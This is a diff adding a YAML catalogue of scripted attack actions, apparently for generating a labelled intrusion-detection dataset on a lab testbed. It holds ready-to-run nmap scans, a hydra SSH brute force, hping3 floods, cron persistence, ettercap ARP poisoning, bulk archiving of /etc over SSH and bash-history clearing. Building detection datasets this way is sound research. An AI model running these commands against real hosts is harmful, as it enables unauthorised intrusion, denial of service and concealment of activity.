@@ -1,0 +1,88 @@
+# Scaled dataset campaign catalogue for Objective 3 (no-malware, tool-based).
+# Consumed by run_campaign.sh. Each ACTION becomes one run_action.sh interval ->
+# one labels.csv row (attack_type = fine sub-label, stage = coarse stage). Durations
+# are chosen so each instance spans MANY windows (CVERIFY lesson: 0.34 s recon was
+# useless; telemetry @2Hz + W=5s means ~dur/5 window-samples per instance).
+#
+# Placeholders substituted by run_campaign.sh: {VIP}=victim ip, {V2IP}=other victim,
+# {WL}=wordlist path, {KEY}=ssh key. Host-silo stages run ON the victim over SSH.
+#
+# target modality legend (expected primary signal, for coverage planning):
+#   net=network host=auditd/journald tel=telemetry
+
+defaults:
+  # per instance; repeat across runs to reach the window targets (see Q5)
+  baseline_gap_s: 20        # quiescent benign between actions (-> benign windows)
+  target_windows_per_stage: 2000
+  target_windows_per_sublabel: 1000
+
+stages:
+
+  # ---- RECON (network) : sub-labelled by scan type (Q3) --------------------
+  # single-target (avoids /24 dual-victim label ambiguity); -T3 + trimmed ranges
+  # keep each instance ~30-60s (multi-window) without the multi-minute UDP/OS blowup.
+  # full-/wide-port ranges so each scan spans MANY windows (pilot showed -p1-1000
+  # SYN/connect finished in <1s -> 1 window). Repeated hostsweep for the same reason.
+  - {stage: recon, attack_type: recon_hostsweep,   silo: net, dur_hint_s: 30, cmd: "for i in 1 2 3 4 5 6; do sudo nmap -sn -PS22,80,443,3389,8080 -PE {VIP}; sleep 3; done"}
+  # RANDOM per-run --scan-delay (10-24ms) over a moderate range so each scan SPANS
+  # ~30-70s (many windows) instead of finishing in <3s (1-2 windows); delay << runtime.
+  - {stage: recon, attack_type: recon_synscan,     silo: net, dur_hint_s: 50, cmd: "sudo nmap -sS -T3 -p1-3000 --scan-delay $((RANDOM%15+10))ms {VIP}"}
+  - {stage: recon, attack_type: recon_connectscan, silo: net, dur_hint_s: 50, cmd: "nmap -sT -T3 -p1-5000 --scan-delay $((RANDOM%15+10))ms {VIP}"}
+  - {stage: recon, attack_type: recon_udpscan,     silo: net, dur_hint_s: 60, cmd: "sudo nmap -sU -T3 --top-ports 100 {VIP}"}
+  - {stage: recon, attack_type: recon_stealthscan, silo: net, dur_hint_s: 50, cmd: "sudo nmap -sF -T3 -p1-3000 --scan-delay $((RANDOM%15+10))ms {VIP}"}
+  - {stage: recon, attack_type: recon_osdetect,    silo: net, dur_hint_s: 45, cmd: "sudo nmap -sV -O -T4 --top-ports 100 {VIP}"}
+
+  # ---- BRUTE-FORCE (network + host) ----------------------------------------
+  # 3 repeated bursts (~3x windows) -- a fast dict burst is inherently short, and a
+  # bigger wordlist just makes sshd throttle it; repeating the burst preserves its
+  # fast-burst character while yielding more windows. Bottleneck stage.
+  - {stage: bruteforce, attack_type: bruteforce_dict, silo: net+host, dur_hint_s: 120, cmd: "for i in 1 2 3; do hydra -l pi -P {WL} -t 4 -f ssh://{VIP}; sleep 5; done"}
+  # slow/low-and-slow is handled specially by run_campaign.sh (per-attempt labelling)
+  # own STAGE (low-and-slow != burst dict): one labelled interval per attempt, RANDOM
+  # inter-attempt delay (3-8s) << the variant's ~90-160s runtime; 20 attempts for yield.
+  - {stage: bruteforce_slow, attack_type: bruteforce_slow, silo: net+host, dur_hint_s: 140, mode: slow, attempts: 20, min_gap_s: 3, max_gap_s: 8}
+
+  # ---- IMPACT (network + telemetry) ----------------------------------------
+  # flood SUBCLASSES (distinct network signatures): SYN / UDP / ACK / ICMP. All
+  # bounded by packet count (-c) + interval (-i) so they stay ~30s, not unbounded.
+  - {stage: ddos, attack_type: ddos_synflood,  silo: net+tel, dur_hint_s: 30, cmd: "sudo hping3 -S -p 22 -i u1500 -c 20000 {VIP}"}
+  - {stage: ddos, attack_type: ddos_udpflood,  silo: net+tel, dur_hint_s: 30, cmd: "sudo hping3 --udp -p 53 -i u1500 -c 20000 {VIP}"}
+  - {stage: ddos, attack_type: ddos_ackflood,  silo: net+tel, dur_hint_s: 30, cmd: "sudo hping3 -A -p 80 -i u1500 -c 20000 {VIP}"}
+  - {stage: ddos, attack_type: ddos_icmpflood, silo: net+tel, dur_hint_s: 30, cmd: "sudo hping3 -1 -i u1500 -c 20000 {VIP}"}
+
+  # ---- HOST-SILO stages (run ON the victim over SSH) -----------------------
+  - {stage: execution,   attack_type: execution_lolbin,  silo: host, dur_hint_s: 40, on_victim: true,
+     cmd: "for i in $(seq 1 90); do id>/dev/null; uname -a>/dev/null; cat /etc/os-release>/dev/null; ls -lR /usr/bin>/dev/null 2>&1; sleep 1; done"}
+  # looped add/remove (~40s) for window yield; each iteration is reversible.
+  - {stage: persistence, attack_type: persistence_cron,  silo: host, dur_hint_s: 40, on_victim: true, reversible: true,
+     cmd: "for i in $(seq 1 16); do crontab -l 2>/dev/null > /tmp/cb.$$; { cat /tmp/cb.$$; printf \"%s\\n\" \"*/5 * * * * /tmp/.probe$i\"; } | crontab -; sleep 2; crontab /tmp/cb.$$ 2>/dev/null || crontab -r; rm -f /tmp/cb.$$; sleep 3; done"}
+  # looped SUID/cap discovery + sudo probes (~45s) for window yield
+  - {stage: privesc,     attack_type: privesc_suidscan,  silo: host, dur_hint_s: 45, on_victim: true,
+     cmd: "for i in $(seq 1 6); do sudo -n id 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -50; find / -perm -2000 -type f 2>/dev/null | head -30; getcap -r / 2>/dev/null | head; sleep 2; done"}
+
+  # ---- LATERAL (network, victim-as-attacker) -------------------------------
+  # runs on the OTHER victim (run_on: victim2) scanning the PRIMARY, so the
+  # footprint lands on the harvested (primary) victim. target = primary.
+  - {stage: lateral, attack_type: lateral_scan, silo: net, run_on: victim2, dur_hint_s: 50,
+     cmd: "nmap -sT -T3 -p1-5000 --scan-delay $((RANDOM%15+10))ms {VIP}"}
+
+  # ---- MITM (network weird.log) : ettercap ARP-poison PRIMARY <-> gateway ---
+  # ettercap re-ARPs (restores) on clean exit; `timeout` sends SIGTERM which it
+  # catches. hub<->victim SSH is direct L2 (unaffected). Kept short.
+  # timeout -k 5 25: SIGTERM at 25s, then SIGKILL 5s later if ettercap ignores TERM
+  # (ettercap hangs on SIGTERM -> without -k it blocks run_action until the outer
+  # per-run timeout, truncating the campaign -- observed on rpi3b2 runs 1&3).
+  - {stage: mitm, attack_type: mitm_arp, silo: net, dur_hint_s: 55,
+     cmd: "sudo timeout -k 5 55 ettercap -T -q -M arp:remote /{VIP}// /192.168.0.1//"}
+
+  # ---- EXFILTRATION (network: large asymmetric egress) ---------------------
+  # hub PULLS a bulk archive FROM the victim -> footprint = large outbound flow on
+  # the victim's capture (resp_bytes/duration spike). No malware, no real theft.
+  - {stage: exfil, attack_type: exfil_bulk, silo: net, dur_hint_s: 20,
+     cmd: "ssh -i $HOME/.ssh/hub_to_victim -o BatchMode=yes pi@{VIP} 'tar czf - /etc /var/log /usr/share/doc /usr/lib/python3* 2>/dev/null' > /dev/null"}
+
+  # ---- DEFENSE-EVASION (host: timestomp / log-truncate / history-clear) -----
+  # DECOY files in /tmp only (NEVER touches our real audit.log/journald). Looped
+  # so it spans windows; generates execve + file-write host events. Reversible.
+  - {stage: defense_evasion, attack_type: evasion_logtamper, silo: host, on_victim: true, dur_hint_s: 48,
+     cmd: "for i in $(seq 1 24); do touch -t 202001010000 /tmp/.ev$i 2>/dev/null; echo x > /tmp/decoy$i.log; truncate -s 0 /tmp/decoy$i.log; rm -f /tmp/.ev$i /tmp/decoy$i.log; cat /dev/null > ~/.bash_history 2>/dev/null; sleep 4; done"}
